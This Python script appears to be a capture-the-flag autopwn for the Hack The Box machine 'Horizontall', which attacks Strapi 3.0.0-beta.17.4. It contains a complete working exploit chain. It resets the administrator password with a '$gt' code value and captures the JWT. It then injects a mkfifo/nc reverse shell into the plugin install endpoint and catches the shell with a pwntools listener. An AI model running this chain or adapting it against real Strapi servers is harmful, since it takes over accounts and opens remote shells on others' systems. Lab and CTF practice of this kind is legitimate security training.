#!/usr/bin/env python3
# Author: Juan Garcia aka liandd

import sys
import signal
from termcolor import colored
import argparse
import requests
import re
import json
from pwn import *
import threading


# Variables Globales
thread = None


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...", "red"))
    stop_event.set()

    if thread and thread.is_alive():
        thread.join()

    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Horizontall", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine API URL to Pwn (i.e --url http://api-prod.horizontall.htb/)")
    parser.add_argument('-P', '--password', dest="PASSWORD",
                        help="Set new Password to administrator user (i.e -P paloloco)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.PASSWORD is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.PASSWORD, options.IP, options.PORT


def check_strapi_version(URL):
    p1 = log.progress(colored("Checking Strapi Version...", "red"))
    version = requests.get(URL+'/admin/init').text
    regex = r"""\"strapiVersion\":\"([^\"]+)\""""
    version = re.findall(regex, version)

    if version == ["3.0.0-beta.17.4"]:
        p1.status(colored("This is Vulnerable!!", "green"))
    else:
        print(colored("\n[!] Sorry...\n", "red"))
        sys.exit(1)


def exploitAPI(URL, PASSWORD):
    global jwt
    current_session = requests.session()
    data = {"code": {"$gt": 0},
            "password": PASSWORD,
            "passwordConfirmation": PASSWORD}

    print("\n")
    p2 = log.progress(colored("Setting new Password - %s" % PASSWORD, "blue"))

    output = current_session.post(
        "%s/admin/auth/reset-password" % URL, json=data).text
    p2.status(output)
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print(colored("[!] FAILDED Password reset...\n\n", "red"))
        sys.exit(1)
    else:
        print(colored(
            f"[+] Password reset was successfull\n[+] Your email is: {email}\n[+] New Credentials: {username}:{PASSWORD}\n[+] Your authenticated JSON Web Token: {jwt}\n\n", "green"))


def get_shell(URL, IP, PORT):
    while not stop_event.is_set():
        headers = {"Authorization": f"Bearer {jwt}"}
        payload = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f|bash""" % (
            IP, PORT)
        data = {"plugin": f"documentation && $({payload})",
                "port": "1337"}
        r = requests.post(f"{URL}/admin/plugins/install",
                          json=data, headers=headers)


def main():
    URL, PASSWORD, IP, PORT = get_arguments()
    if URL.endswith("/"):
        URL = URL[:-1]

    check_strapi_version(URL)
    exploitAPI(URL, PASSWORD)

    global stop_event, thread
    stop_event = threading.Event()

    try:
        thread = threading.Thread(target=get_shell, args=(URL, IP, PORT))
        thread.start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
